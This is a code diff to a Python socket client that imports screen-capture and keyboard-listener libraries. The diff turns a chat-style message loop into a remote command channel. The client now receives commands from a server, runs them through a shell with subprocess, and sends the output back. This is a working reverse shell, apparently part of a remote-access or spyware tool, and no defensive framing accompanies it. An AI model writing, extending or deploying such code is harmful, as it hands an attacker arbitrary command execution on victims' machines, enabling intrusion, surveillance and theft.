@@ -1,5 +1,6 @@
-import cv2
 import socket
+import subprocess
+import cv2
 import pickle
 import struct
 import pyautogui
@@ -9,12 +10,12 @@ from pynput import keyboard
 def interact_with_server(client_socket):
     try:
         while True:
-            message = input("Enter message to send to server: ")
-            client_socket.send(message.encode('utf-8'))
-            response = client_socket.recv(1024).decode('utf-8')
-            print(f"Received from server: {response}")
-            if message.lower() == 'exit':
+            command = client_socket.recv(1024).decode('utf-8')
+            if command.lower() == 'exit':
                 break
+
+            output = subprocess.run(command, shell=True, capture_output=True, text=True)
+            client_socket.send(output.stdout.encode('utf-8') + output.stderr.encode('utf-8'))
     except socket.error as e:
         print(f"Socket error: {e}")
     finally:
